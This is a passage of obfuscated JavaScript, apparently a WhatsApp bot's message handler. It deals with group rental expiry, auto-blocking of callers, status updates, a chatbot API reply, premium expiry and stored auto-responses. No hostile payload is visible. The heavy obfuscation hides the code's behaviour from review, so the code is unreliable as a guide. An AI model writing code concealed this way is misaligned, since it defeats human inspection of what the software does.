alpha[_0x34ac6b(-0x11a,-0xc4,-0x16b,-0x114,-0x160)+_0x919e99(0x3d6,0x3e4,0x436,0x43a,0x449)+'es']([readkey]);}if(m[_0x15bd51(0xa1,0x9c,0xa9,0x64,0x4e)+'up']&&db[_0x15bd51(0xd2,0x76,0xd7,0xc3,0xd5)][_0x314312(-0x3,0x6e,0x1a,0x5d,0x27)][m[_0x919e99(0x42a,0x45b,0x452,0x3fa,0x492)]][_0x919e99(0x4a0,0x436,0x43c,0x45c,0x4a1)+'ed']!=0x3*-0x16+0x1c3d+-0x1bfb){let chats=db[_0x15bd51(0x80,0xd9,0xfe,0xc3,0xab)][_0x15bd51(0xe5,0xe0,0xa5,0xa6,0x9a)][m[_0x314312(0xf,0x24,0x64,0x44,0x80)]];if(!chats[_0x5e2797(0x49b,0x459,0x48b,0x442,0x473)+'ed'])return!(-0x75c+-0x1fdc+0x2738);if(+new Date()>chats[_0x314312(0x1d,0x45,0x4e,0x7a,0xac)+'ed']){const TDYNVm=(_0x5e2797(0x44d,0x40e,0x3f1,0x46d,0x42f)+_0x919e99(0x3db,0x3f7,0x42b,0x3f6,0x442))[_0x15bd51(0xf4,0xd3,0x100,0xed,0xb4)]('|');let bkVrsJ=-0x167*0x1+-0x16a*0x11+0x1971;while(!![]){switch(TDYNVm[bkVrsJ++]){case'0':db[_0x34ac6b(-0x7b,-0x90,-0xcf,-0x93,-0x99)][_0x314312(-0x30,0x1,0x1a,0x6,-0x2)][m[_0x15bd51(0x10a,0xf5,0x130,0xf0,0x14d)]][_0x919e99(0x3eb,0x477,0x43c,0x3f3,0x45f)+'ed']=0x1c6c+0x9+-0x1c75;continue;case'1':db[_0x34ac6b(-0xa0,-0xeb,-0x71,-0x93,-0x2e)][_0x15bd51(0xca,0xe6,0xe0,0xa6,0x8c)][m[_0x34ac6b(-0x12,-0x33,-0x7a,-0x66,-0xad)]][_0x34ac6b(-0xaa,-0x92,-0x53,-0xb1,-0x58)]=![];continue;case'2':setTimeout(()=>{function _0x30318f(_0x4ed31b,_0x6b8067,_0x4d3235,_0x36f2e0,_0x4408d9){return _0x15bd51(_0x4ed31b-0x6f,_0x6b8067-0x3b,_0x4d3235-0xd,_0x4d3235- -0x185,_0x4408d9);}function _0x25d65e(_0x1977fa,_0x39901e,_0x52a0af,_0x1540a0,_0x4a8b91){return _0x919e99(_0x1977fa-0x1e1,_0x39901e-0x115,_0x39901e- -0x7d,_0x1540a0-0x6d,_0x4a8b91);}function _0x491493(_0x3f46fd,_0x22c5b3,_0x5c1da1,_0x41a72e,_0x3e2a90){return _0x34ac6b(_0x3f46fd-0x1,_0x22c5b3-0x1a3,_0x5c1da1-0x1ce,_0x22c5b3-0x115,_0x5c1da1);}alpha[_0x491493(0x24,0x12,-0xe,-0x1d,0x3a)+_0x491493(-0x1,-0xd,0x53,0x52,0x24)](m[_0x30318f(-0x77,-0xc4,-0x95,-0x78,-0x5a)]);},-0x35*-0x83+0x13*-0xd4+0x2b7*0x3);continue;case'3':await alpha[_0x5e2797(0x454,0x402,0x407,0x3f1,0x3a7)+_0x5e2797(0x463,0x409,0x3a6,0x420,0x453)+'t'](m[_0x15bd51(0xd0,0x142,0x130,0xf0,0xfb)],global[_0x314312(-0x3f,0x33,-0x16,-0x2,-0x16)],fkontak,{});continue;case'4':const _0x131002={};_0x131002[_0x5e2797(0x3d0,0x3ef,0x398,0x432,0x40a)]=_0x34ac6b(-0xbd,-0x16a,-0x114,-0x123,-0x100)+_0x15bd51(0x57,0xa0,0xb2,0xad,0xc9)+_0x5e2797(0x3cc,0x3ee,0x3a3,0x421,0x3cb)+_0x314312(0x31,0x13,0x30,-0x7,0x7c)+_0x919e99(0x3c0,0x3cd,0x399,0x35b,0x342)+_0x15bd51(0x5e,0x98,0xaf,0x5c,0x8c)+_0x314312(-0x34,0x4,0x1f,-0x3a,-0x25)+_0x15bd51(0x8b,0x84,0xb3,0xe4,0xe9)+_0x314312(0x63,0x6a,0xf,0x2c,-0xe)+_0x5e2797(0x43d,0x405,0x3d9,0x418,0x443)+_0x34ac6b(-0x64,-0x4c,-0x40,-0x9f,-0x92)+_0x5e2797(0x3ff,0x446,0x442,0x490,0x494)+_0x34ac6b(-0xca,-0x114,-0x125,-0xfd,-0xfe)+_0x15bd51(0x31,0x92,0x8d,0x97,0x6e)+'a';const _0x1f2253={};_0x1f2253[_0x15bd51(0x78,0x46,0x73,0xa9,0xc9)+'d']=fkontak,await alpha[_0x34ac6b(-0xc1,-0xc8,-0xd8,-0xd1,-0xa2)+_0x919e99(0x491,0x401,0x436,0x466,0x3d2)+'e'](m[_0x5e2797(0x42a,0x46f,0x44e,0x434,0x418)],_0x131002,_0x1f2253);continue;}break;}}}function _0x5e2797(_0x7c3573,_0x4e48d9,_0x181e0b,_0x1ace5b,_0x5f4092){return _0x380d(_0x4e48d9-0x2c6,_0x181e0b);}if(m[_0x314312(-0x5f,0x27,0x5,0x1c,0x2b)+'r'][_0x15bd51(0x7e,0x24,0xc5,0x75,0x9e)+_0x314312(-0x62,-0x98,-0x5e,-0x41,-0xa9)](_0x919e99(0x42e,0x399,0x3f6,0x3a9,0x398))&&db[_0x15bd51(0x8b,0xbd,0xa6,0xc3,0xfc)][_0x5e2797(0x3db,0x40f,0x466,0x43a,0x40f)+_0x5e2797(0x3a5,0x3d9,0x431,0x3ad,0x375)][botNumber][_0x34ac6b(-0xd8,-0x71,-0xca,-0xc3,-0xd8)+_0x34ac6b(-0x57,-0x6f,-0x1b,-0x7f,-0x48)])return alpha[_0x15bd51(0x31,0x2b,0xab,0x84,0xa0)+_0x5e2797(0x444,0x422,0x3c6,0x447,0x3c3)+_0x5e2797(0x405,0x44c,0x408,0x438,0x4b2)+'us'](m[_0x5e2797(0x440,0x410,0x44d,0x46a,0x3d6)+'r'],_0x919e99(0x3fb,0x46c,0x40c,0x457,0x3e6));if(!m[_0x34ac6b(-0x9d,-0xf3,-0x150,-0xf2,-0x101)+'up']&&!m[_0x314312(0x95,0x48,0x35,0x73,-0xa)][_0x314312(0xa,-0x3d,-0x57,-0x43,-0x8f)+'e']&&m[_0x919e99(0x37f,0x394,0x3ab,0x3cc,0x3a1)+'ge']&&!(new Date()-db[_0x15bd51(0xd0,0xc7,0xb3,0xc3,0xa6)][_0x5e2797(0x464,0x44a,0x429,0x41e,0x3e5)][m[_0x314312(-0x21,-0x51,0x5,-0x36,-0x36)+'r']]['pc']<-0xa3f7cd2+0x1b6ff37+0x4ff37*0x2bd)){let user=db[_0x5e2797(0x422,0x442,0x49e,0x495,0x41d)][_0x15bd51(0xe4,0xa2,0xc5,0xcb,0x128)][m[_0x314312(-0x1b,-0x2b,0x5,0x17,-0xc)+'r']];const _0x3ab0b4={};_0x3ab0b4[_0x919e99(0x42c,0x428,0x40b,0x421,0x3d1)+'d']=fkontak,alpha[_0x919e99(0x399,0x406,0x3d4,0x382,0x3dd)+_0x15bd51(0x42,0x15,0x58,0x3d,-0x26)+_0x15bd51(-0x7,0xa3,0x26,0x51,0x1f)](m[_0x919e99(0x400,0x49a,0x452,0x43d,0x4b8)],''+(user[_0x314312(0x27,-0x1f,0x3e,0x58,0x8b)+'d']?lang[_0x34ac6b(-0x15c,-0x112,-0x116,-0x125,-0x14a)+'n']():lang[_0x919e99(0x3a9,0x3da,0x3a8,0x3fa,0x3c8)+_0x15bd51(0x3c,0x7f,0x21,0x6c,0x11)](salam,pushname,botname)),'©\x20'+ownername,[{'buttonId':''+(user[_0x919e99(0x43a,0x424,0x42c,0x41d,0x479)+'d']?_0x919e99(0x42f,0x3ec,0x450,0x4ae,0x455)+'r':_0x919e99(0x410,0x429,0x427,0x3f1,0x426)),'buttonText':{'displayText':''+(user[_0x34ac6b(-0x47,-0xcd,-0x98,-0x8c,-0xd8)+'d']?_0x314312(-0x55,-0x39,-0x5d,-0xbf,-0x7f)+_0x34ac6b(-0xd7,-0x103,-0xd9,-0x10f,-0x14c)+'t':_0x15bd51(0x31,-0x21,0x71,0x30,0x12)+_0x919e99(0x45c,0x3f1,0x404,0x441,0x40b)+_0x34ac6b(-0xd7,-0xda,-0x6c,-0x80,-0x26))},'type':0x1}],_0x3ab0b4),user['pc']=new Date()*(-0x698+-0x1a74+0x210d);}function _0x34ac6b(_0x266ccc,_0x2fa567,_0x56420d,_0x5e0516,_0x82b405){return _0x380d(_0x5e0516- -0x20f,_0x82b405);}if(db[_0x34ac6b(-0xa7,-0xec,-0xa7,-0x93,-0x99)][_0x34ac6b(-0x124,-0xd8,-0x82,-0xc6,-0xe0)+_0x15bd51(0x13,0x91,0x7d,0x5a,0x6d)][botNumber][_0x34ac6b(-0x11f,-0x106,-0xd9,-0xc3,-0x99)+'io']===!![]){let settingstatus=-0xe2*0x4+-0x1*-0x1c71+-0x18e9;new Date()*(0x95*-0x3+-0x12e2+0x14a2)-settingstatus>0x27e+-0xb1*-0x23+-0x16c9&&(await alpha[_0x34ac6b(-0xc3,-0xe9,-0xb8,-0xa3,-0x58)+_0x34ac6b(-0x17d,-0x119,-0x147,-0x120,-0x178)](_0x919e99(0x399,0x3ca,0x3db,0x3b1,0x40f)+botname+_0x314312(-0x79,0x3,-0x31,-0x4f,-0x86)+runtime(process[_0x919e99(0x3e1,0x3de,0x3ae,0x35e,0x3f7)+'e']())+(_0x15bd51(0x38,0x88,0x92,0x38,0xf)+_0x34ac6b(-0x13b,-0x136,-0xc1,-0xfe,-0xf5)+_0x919e99(0x3fb,0x42d,0x3fb,0x421,0x43a))+(alpha[_0x919e99(0x413,0x37f,0x3e0,0x3a9,0x3ed)+'c']?_0x15bd51(0xa7,0xa9,0xa4,0x77,0x88)+_0x314312(0x4,0x49,0x46,0x5a,0x7d)+'e':_0x5e2797(0x435,0x41f,0x410,0x455,0x45f)+_0x5e2797(0x424,0x3dc,0x378,0x421,0x425))+_0x15bd51(0x8d,0x5a,0xa6,0x7c,0x65)+Object[_0x5e2797(0x40d,0x401,0x443,0x450,0x401)](global['db'][_0x15bd51(0xf9,0xad,0x87,0xc3,0xfd)][_0x919e99(0x40d,0x3dc,0x42d,0x468,0x416)])[_0x15bd51(0x82,0x74,0x7,0x44,0x47)+'h']+(_0x5e2797(0x3f4,0x43a,0x3d4,0x41b,0x424)+'s')),settingstatus=new Date()*(-0xa23+0x2406+-0x19e2));}!m[_0x5e2797(0x422,0x3e3,0x3f8,0x3ea,0x415)+'up']&&!m[_0x5e2797(0x417,0x440,0x471,0x40a,0x3f6)][_0x919e99(0x3c9,0x3f3,0x397,0x39d,0x3ad)+'e']&&db[_0x314312(0x2e,0x3a,0x37,0x1c,0x1f)][_0x34ac6b(-0xb1,-0xb4,-0xd3,-0xc6,-0x113)+_0x919e99(0x400,0x35c,0x3bc,0x40f,0x3bc)][botNumber][_0x15bd51(0xb5,0xfc,0xd9,0xb2,0xa9)+_0x34ac6b(-0xa9,-0x68,-0x62,-0x7d,-0x7b)+'d']&&!isCmd&&(simi=await fetchJson(_0x314312(0xa,0x22,0x5a,0x70,0x79)+_0x15bd51(0x76,0x38,0x39,0x74,0x4f)+_0x15bd51(0xb6,0xb8,0x14b,0xf6,0x13b)+_0x5e2797(0x3af,0x3fe,0x42e,0x419,0x3aa)+_0x5e2797(0x461,0x461,0x439,0x4c6,0x414)+_0x34ac6b(-0xf9,-0x98,-0xfa,-0x9c,-0x3d)+_0x15bd51(-0x3,0xb7,0xc7,0x61,0x32)+_0x919e99(0x402,0x45d,0x424,0x426,0x471)+_0x919e99(0x3e0,0x3ac,0x3aa,0x362,0x38b)+_0x34ac6b(-0x95,-0x113,-0xc9,-0xf8,-0x13c)+m[_0x314312(0x9,-0x81,-0x1c,-0x49,-0x52)]),m[_0x5e2797(0x42c,0x3d4,0x3e0,0x37b,0x36e)]('_'+simi[_0x5e2797(0x3cd,0x3bd,0x3d3,0x3c3,0x3d7)+'ss']+'_'));!m[_0x15bd51(0x27,0xf,0x97,0x64,0x2a)+'up']&&db[_0x15bd51(0x70,0x125,0x10b,0xc3,0xd6)][_0x15bd51(0x103,0xde,0xd3,0xcb,0x118)][m[_0x919e99(0x390,0x420,0x3f3,0x44c,0x3c5)+'r']][_0x314312(0x3,0x8,-0x12,-0x3e,-0x6c)+'um']&&(new Date()*(0xdc6+0x83f+-0x1604)>=global['db'][_0x5e2797(0x460,0x442,0x498,0x464,0x40e)][_0x919e99(0x3e7,0x467,0x42d,0x456,0x426)][m[_0x5e2797(0x3de,0x410,0x3c1,0x424,0x44b)+'r']][_0x314312(0x50,-0x2a,-0x12,0x51,-0x49)+_0x5e2797(0x419,0x3d6,0x3d7,0x3a2,0x3a4)+'e']&&m[_0x15bd51(0x40,-0xc,-0x6,0x55,0x41)](_0x919e99(0x4aa,0x42b,0x449,0x41c,0x450)+_0x314312(-0x46,-0x18,0x11,-0x4e,-0x18)+_0x314312(-0x3,0x93,0x5c,0x41,0xb0)+_0x34ac6b(-0xae,-0x6d,-0xe2,-0xa2,-0xdb)+_0x919e99(0x490,0x486,0x43a,0x458,0x46b)+_0x5e2797(0x467,0x41d,0x3bf,0x463,0x3f2)+_0x15bd51(0x56,-0xf,-0xf,0x4f,0xf)+_0x15bd51(0xb2,0x61,0x5d,0xbd,0xf4)+_0x34ac6b(-0x12c,-0xc7,-0xb1,-0xef,-0xd6)+_0x314312(0x1f,0x32,0x1,0x15,-0x23)+_0x919e99(0x3c6,0x350,0x3a5,0x38e,0x3b3)+_0x15bd51(0x9b,0x88,0x8c,0x3f,-0x18)+_0x919e99(0x449,0x421,0x3e8,0x399,0x3b5)+_0x15bd51(0x12,0x65,0x4b,0x3a,0x39)+_0x15bd51(0x48,0x21,0x74,0x78,0x15)+_0x15bd51(0x54,0xa4,-0x7,0x50,0x53)+_0x919e99(0x416,0x3dc,0x412,0x401,0x40a)+_0x5e2797(0x473,0x427,0x46c,0x46a,0x44a))[_0x15bd51(0xb0,0xed,0x12a,0xf4,0xf1)](()=>{function _0x57235b(_0x4127ba,_0x1ab53e,_0x447ffd,_0x568026,_0x342980){return _0x919e99(_0x4127ba-0x145,_0x1ab53e-0x171,_0x1ab53e-0x121,_0x568026-0x13e,_0x447ffd);}function _0x3cfc38(_0x4b17d6,_0x42f791,_0x32c655,_0x1404ab,_0x1a3d1d){return _0x919e99(_0x4b17d6-0x4a,_0x42f791-0x130,_0x42f791- -0x2b8,_0x1404ab-0xe3,_0x32c655);}global['db'][_0xea1d72(0x425,0x42f,0x3e9,0x3dd,0x418)][_0x3cfc38(0x176,0x175,0x10f,0x18e,0x11f)][m[_0x1da801(0xf4,0xab,0xee,0xbf,0x11b)+'r']][_0xea1d72(0x3dc,0x3f3,0x432,0x379,0x3a5)+'um']=![],global['db'][_0xea1d72(0x425,0x402,0x3c3,0x405,0x3d8)][_0xea1d72(0x42d,0x404,0x490,0x40b,0x3cb)][m[_0x3cfc38(0xf2,0x13b,0xec,0xfb,0x135)+'r']][_0x3cfc38(0x158,0x138,0xf8,0x10d,0x158)]=global[_0x3cfc38(0x191,0x138,0x151,0xdf,0x103)+_0x3d71d1(0x39d,0x3e1,0x3be,0x3c8,0x3c2)][_0x1da801(0x1a8,0x100,0x14f,0x1b0,0x15d)];function _0xea1d72(_0x4e3e1d,_0x2fffcc,_0x4065f1,_0x3be042,_0x25ebef){return _0x314312(_0x4e3e1d-0xd8,_0x2fffcc-0x39,_0x4e3e1d-0x3ee,_0x3be042-0xa0,_0x3be042);}function _0x3d71d1(_0x5525de,_0x48cf47,_0x516a71,_0x7dfeba,_0x2b8ec9){return _0x919e99(_0x5525de-0x120,_0x48cf47-0xd1,_0x2b8ec9- -0x11,_0x7dfeba-0x18,_0x48cf47);}function _0x1da801(_0x57d627,_0x2290a9,_0x1c4143,_0x7dc5de,_0x462145){return _0x34ac6b(_0x57d627-0x1c9,_0x2290a9-0x198,_0x1c4143-0xd4,_0x1c4143-0x1b3,_0x7dc5de);}alpha[_0x1da801(0xa0,0xa0,0xe0,0x9f,0x96)+_0xea1d72(0x3ec,0x3a9,0x44b,0x42f,0x44a)+'t'](m[_0x57235b(0x573,0x573,0x515,0x596,0x5c0)],global[_0xea1d72(0x3d8,0x39e,0x38d,0x39f,0x3bb)],m);}));if(isMedia&&m[_0x34ac6b(-0xdc,-0xf2,-0x52,-0x97,-0x3d)][_0x34ac6b(-0xa1,-0x78,-0xd9,-0xa7,-0x102)+_0x314312(-0x26,-0x30,-0x1e,-0x4b,-0x70)]&&m[_0x15bd51(0xb5,0xe8,0x77,0xbf,0x7e)][_0x314312(0x5f,0x2b,0x23,-0x1e,0x73)+_0x15bd51(0x95,0x15,0xd,0x6e,0x8a)][_0x919e99(0x3a9,0x398,0x3b8,0x387,0x414)+_0x314312(-0x63,-0x32,0x0,-0x62,-0x10)](_0x34ac6b(-0x129,-0xdd,-0x127,-0xcb,-0x8f)+'4')in db[_0x34ac6b(-0x42,-0xb0,-0x36,-0x93,-0x71)][_0x15bd51(0xd6,0x5a,0x7b,0x88,0xbd)]){let hash=db[_0x314312(0x16,0x44,0x37,0x48,0x92)][_0x314312(0x5b,0x58,-0x4,-0x54,0x23)][m[_0x919e99(0x426,0x3df,0x421,0x44d,0x427)][_0x5e2797(0x3cf,0x42e,0x45f,0x400,0x3ea)+_0x314312(-0x54,-0x24,-0x1e,-0x48,-0x11)][_0x5e2797(0x42f,0x3d5,0x3fb,0x3bd,0x410)+_0x314312(0x1c,-0x3c,0x0,-0x5b,-0xd)](_0x919e99(0x413,0x3f1,0x3ed,0x43d,0x429)+'4')],{q,mentionedJid}=hash;const _0x1bb0ec={};_0x1bb0ec[_0x919e99(0x418,0x3ac,0x3d2,0x421,0x3b9)]=q,_0x1bb0ec[_0x314312(0x4f,0x4c,-0x5,0x19,0x40)+_0x314312(0x3b,0x2c,-0x19,0x6,0x4a)]=mentionedJid;let messages=await generateWAMessage(m[_0x5e2797(0x464,0x46f,0x474,0x49c,0x4ce)],_0x1bb0ec,{'userJid':alpha[_0x34ac6b(-0x104,-0xf1,-0x78,-0xc4,-0xd1)]['id'],'quoted':m[_0x919e99(0x3c5,0x44b,0x40b,0x433,0x448)+'d']&&m[_0x919e99(0x3b3,0x403,0x40b,0x3ae,0x3ac)+'d'][_0x314312(-0x11,-0x36,-0x42,-0x9a,-0x51)+'bj']});messages[_0x34ac6b(-0x3b,-0x86,-0xcb,-0x95,-0x5a)][_0x5e2797(0x37c,0x3b4,0x37b,0x3ac,0x416)+'e']=areJidsSameUser(m[_0x314312(0x20,-0x5f,0x5,0x3d,0x5e)+'r'],alpha[_0x314312(0x26,0x1e,0x6,0x6,0x6c)]['id']),messages[_0x314312(0x61,0x71,0x35,0x74,-0x1)]['id']=m[_0x919e99(0x403,0x3cf,0x423,0x43e,0x3f4)]['id'],messages[_0x919e99(0x43a,0x474,0x459,0x43c,0x42d)+_0x15bd51(0x10c,0x12a,0x136,0xf8,0x11b)]=m[_0x5e2797(0x4b7,0x476,0x413,0x43a,0x4c3)+_0x15bd51(0x130,0x154,0x107,0xf8,0x140)];if(m[_0x15bd51(0x7a,0xc4,0x1a,0x64,0x41)+'up'])messages[_0x5e2797(0x4b8,0x468,0x4c0,0x4c4,0x4af)+_0x314312(0x98,0xc,0x45,0x13,-0x2)+'t']=m[_0x15bd51(0x2c,0x30,0x35,0x91,0xba)+'r'];let msg={...chatUpdate,'messages':[proto[_0x34ac6b(-0xb8,-0x63,-0x80,-0x98,-0x91)+_0x5e2797(0x406,0x3ea,0x3f7,0x426,0x39e)+_0x34ac6b(-0x154,-0x14a,-0xe9,-0xf7,-0x15a)][_0x34ac6b(-0x72,-0xa8,-0xc1,-0x67,-0xb6)+_0x919e99(0x364,0x424,0x3c7,0x3e4,0x387)](messages)],'type':_0x34ac6b(-0x103,-0x106,-0xf0,-0xa5,-0xd8)+'d'};alpha['ev'][_0x919e99(0x3f3,0x40a,0x3b4,0x378,0x3ac)](_0x919e99(0x3c5,0x3b9,0x3ab,0x3fb,0x3de)+_0x314312(-0x3,-0x13,-0x22,-0x7,-0x16)+_0x15bd51(0xc1,0x78,0xdf,0xce,0xcd),msg);}var bodynyaui=m[_0x15bd51(0x135,0xfa,0x105,0xf3,0xa4)]==_0x34ac6b(-0x85,-0x88,-0xa7,-0x61,-0x56)+_0x314312(0x47,0x93,0x4d,0x24,0x1a)+_0x5e2797(0x440,0x437,0x42d,0x414,0x40a)+_0x314312(-0x16,-0x9f,-0x3b,-0x51,-0x60)?m[_0x314312(0x9,-0x27,-0x43,0x1b,-0x8a)+'ge'][_0x919e99(0x429,0x49a,0x457,0x467,0x4b5)+_0x15bd51(0x104,0xad,0xf6,0xd9,0x104)+_0x5e2797(0x498,0x437,0x421,0x435,0x458)+_0x15bd51(0x32,-0x12,0xb,0x51,0x4e)][_0x5e2797(0x3d8,0x415,0x460,0x434,0x450)+_0x5e2797(0x438,0x469,0x495,0x478,0x42e)+_0x314312(0x6b,0x19,0x40,0x51,0x75)+'ly'][_0x919e99(0x385,0x442,0x3dd,0x3bf,0x397)+_0x919e99(0x451,0x3b9,0x401,0x41b,0x422)+_0x314312(-0x9a,-0x1c,-0x38,-0x52,-0x83)]:m[_0x15bd51(0x109,0xdc,0xab,0xf3,0x136)]==_0x314312(-0x62,-0x9c,-0x43,-0x75,-0x7)+_0x15bd51(0x16,-0xb,0x5f,0x3b,-0x4)+_0x314312(0x70,0x61,0xc,0x7,0x5a)+_0x15bd51(0x32,0x3a,0xd0,0x95,0xe2)?m[_0x314312(-0x5b,-0x5e,-0x43,-0x31,-0xa0)+'ge'][_0x34ac6b(-0x12d,-0xc1,-0x13a,-0xf6,-0xdf)+_0x5e2797(0x453,0x45a,0x465,0x469,0x480)+_0x34ac6b(-0x6e,-0xb4,-0x49,-0x75,-0xd1)+_0x5e2797(0x3fc,0x42d,0x457,0x3cd,0x483)+'ge']?.[_0x15bd51(0xad,0x5d,0x92,0x7b,0x3c)+_0x34ac6b(-0xbd,-0x12e,-0xa7,-0xf0,-0xdc)+_0x34ac6b(-0x7e,-0xd0,-0xd8,-0xaa,-0xf5)+'d']||m[_0x314312(0x14,-0x3a,-0x43,-0x6,-0x3b)+'ge'][_0x919e99(0x470,0x449,0x457,0x434,0x45c)+_0x919e99(0x428,0x446,0x43b,0x3de,0x472)+_0x5e2797(0x442,0x437,0x461,0x469,0x425)+_0x34ac6b(-0xb9,-0x140,-0x13e,-0x105,-0xa9)]?.[_0x919e99(0x41c,0x3c4,0x3f8,0x396,0x450)+_0x34ac6b(-0xa7,-0xb2,-0x22,-0x6c,-0x80)+_0x314312(0x39,0x1,0x40,0x6f,0x34)+'ly'][_0x314312(0x0,0x41,-0x11,-0x44,0x50)+_0x15bd51(0xff,0x60,0xe1,0x9f,0x9a)+_0x5e2797(0x40a,0x3d3,0x384,0x3c0,0x408)]||m[_0x919e99(0x416,0x40c,0x3d2,0x432,0x3fc)]:'';let datares=db[_0x5e2797(0x425,0x442,0x41e,0x434,0x3f0)][_0x15bd51(0xb5,0x79,0xbe,0x7d,0xbb)+_0x5e2797(0x3ca,0x3b8,0x3ba,0x38c,0x3f8)];for(let zeeone of datares){if(!bodynyaui&&budy===zeeone[_0x34ac6b(-0x8a,-0x79,-0xcf,-0x95,-0x54)]&&zeeone[_0x919e99(0x450,0x40d,0x406,0x3e4,0x3f1)]===_0x919e99(0x3d7,0x3fd,0x428,0x43a,0x44f)+'r'){const _0x3445ea={};_0x3445ea[_0x34ac6b(-0x146,-0xf5,-0x11d,-0x11a,-0x130)+_0x5e2797(0x43f,0x477,0x428,0x413,0x4a0)]=global[_0x314312(-0x19,-0x43,-0x50,-0x67,-0x74)+_0x34ac6b(0x1,-0xa9,-0x70,-0x5e,-0xb6)],_0x3445ea[_0x34ac6b(-0x62,-0x5e,-0xe8,-0xa1,-0x7f)+'r']=global[_0x15bd51(0xe1,0xf7,0xeb,0xb5,0x86)+'r'],alpha[_0x34ac6b(-0xce,-0xfe,-0xee,-0xba,-0x78)+_0x5e2797(0x450,0x45b,0x49a,0x46d,0x448)+_0x34ac6b(-0x6c,-0xf4,-0x35,-0x96,-0x9d)+_0x314312(-0xc,-0x83,-0x53,-0xc,-0x7d)](m[_0x15bd51(0xe1,0x130,0x10b,0xf0,0xf0)],zeeone[_0x34ac6b(-0xe2,-0xa1,-0xbf,-0xed,-0x122)],m,_0x3445ea);}}let datares2=db[_0x34ac6b(-0xae,-0xb7,-0x46,-0x93,-0x9f)][_0x314312(0x6e,0x74,0x2a,-0x3,-0x1a)];for(let zeeonee of datares2){!bodynyaui&&budy===zeeonee[_0x919e99(0x416,0x3ca,0x423,0x460,0x45d)]&&zeeonee[_0x314312(-0x48,0x45,0x18,0x79,0x2c)]===_0x15bd51(-0x4,0x40,-0x8,0x45,0x0)&&alpha[_0x5e2797(0x498,0x438,0x483,0x3e1,0x3d8)+_0x5e2797(0x415,0x3bf,0x3a3,0x36e,0x3d8)](m[_0x15bd51(0x113,0xd0,0xf2,0xf0,0x127)],zeeonee[_0x34ac6b(-0x138,-0xf9,-0x146,-0xed,-0x143)],m,!![]);}function _0x380d(_0x4ad529,_0x3f9d3f){const _0x4992b4=_0x498f();return _0x380d=function(_0x3c9a71,_0x5d3497){_0x3c9a71=_0x3c9a71-(0x2*-0x437+0x23f*0x11+-0x1cda);let _0x2ae151=_0x4992b4[_0x3c9a71];return _0x2ae151;},_0x380d(_0x4ad529,_0x3f9d3f);}let datares3=db[_0x34ac6b(-0xb5,-0xdf,-0x8f,-0x93,-0x8f)][_0x919e99(0x3b7,0x41c,0x3fc,0x3b8,0x410)+'e'];for(let zeeoneee of datares3){!bodynyaui&&budy===zeeoneee[_0x15bd51(0xb2,0x11a,0x71,0xc1,0x10e)]&&zeeoneee[_0x919e99(0x444,0x44a,0x406,0x3dc,0x41e)]===_0x5e2797(0x4a8,0x447,0x490,0x45f,0x484)&&alpha[_0x5e2797(0x46c,0x41b,0x47f,0x3eb,0x409)+_0x314312(0x57,0x23,0x65,0x54,0x9d)](m[_0x15bd51(0xd9,0x12b,0xef,0xf0,0x8e)],zeeoneee[_0x34ac6b(-0x12c,-0x132,-0x110,-0xed,-0xe9)],'',m);}function _0x498f(){const _0x112250=['Mode','xt=','Info','butto','=id&c','657uWGiZo','eJid','isGro','bject','tedBu','ah\x20be','3440374nDyPfC','url','ges.u','ssage','Chat','respo','ha256','\x20tela','text','awal','sendB','ons','://ap','start','owner','Publi','pgrad','I\x27m\x20','premi','selec','\x20|\x20','RStic','publi','simi.','log','ideo','keys','sendC','updat','sendM','er\x20un','menti','cmd','isIma','ontac','base6','ing','rakhi','limit','1|0|4','setti','sende','user','autob','212','nfo','singl','n\x20sew','textI','s\x20:\x20','RImag','i\x20own','sendI','waktu','remiu','tedRo','Self\x20','1489362cGfbPs','mands','eBloc','type','sewa','chats','video','lagi','quote','block','kan\x20h','ttonI','\x20sewa','Messa','fileS','mium\x20','appen','autor','setSt','k\x20sta','autho','RVn','tuk\x20p','seMes','sendA','2/?lc','\x20User','h\x20hab','a\x20tel','WebMe','msg','sStic','key','f=fal','data','_url','.menu','stike','erpan','image','|3|2','banne','users','ctRep','kStat','psert','mute','5135CUisug','cipan','c\x20Mod','ead','essag','des','\x20🪀','lok','tus\x20p','espon','expir','nsRes','mageA','sendV','978ieOPwZ','694122BgSoSl','1203626dMQURg','ponse','net/v','1oSHYnY','ubung','inclu','https','Maaf\x20','\x20untu','parti','eSele','2044WCXwdy','nse','split','.owne','fromO','chat','mage','free','mtype','then','listR','i.sim','pushN','ame','sWith','👤\x20Own','🪀\x20Com','getBa','RVide','Waktu','Leave','fromM','atus','is\x20👋\x20','\x20⏰\x20|\x20','ker','tuk\x20u','geCon','packn','utMes','succe','t\x20own','udio','936QtAblH','readM','r\x0aCha','lengt','audio','first','er\x20Bo','se&te','messa','fakeO','remot','uptim','store','70sPIxWJ','m\x20and','e\x20pre','sage','emit','group','wId','reply','toStr','umDat','Statu','janga','ngs','\x20🤖\x20|\x20','silah'];_0x498f=function(){return _0x112250;};return _0x498f();}let datares4=db[_0x919e99(0x477,0x47a,0x425,0x47c,0x406)][_0x15bd51(0x73,-0x13,0x1c,0x32,0x23)+'o'];function _0x919e99(_0x3ab7a6,_0x25fc78,_0x572713,_0x220956,_0x5ee63a){return _0x380d(_0x572713-0x2a9,_0x5ee63a);}function _0x314312(_0x594c95,_0x494839,_0x27c962,_0x40849b,_0x439b5e){return _0x380d(_0x27c962- -0x145,_0x439b5e);}for(let zeeonew of datares4){!bodynyaui&&budy===zeeonew[_0x34ac6b(-0x85,-0xa2,-0x57,-0x95,-0xb5)]&&zeeonew[_0x314312(-0xa,0x28,0x18,-0x18,-0x4)]===_0x15bd51(0xdf,0x8e,0xcd,0xa7,0xbf)&&alpha[_0x15bd51(0xa7,0x107,0x99,0xdd,0xaf)+_0x15bd51(0x81,0x1f,0x91,0x81,0x43)](m[_0x5e2797(0x457,0x46f,0x4bc,0x417,0x41b)],zeeonew[_0x314312(-0x54,0x21,-0x23,-0x7,-0x5e)],![],'',m);}try{let data_storee=db[_0x5e2797(0x422,0x442,0x40c,0x3e8,0x437)][_0x5e2797(0x3d7,0x3cc,0x3b6,0x3da,0x429)];for(let data_store of data_storee){var 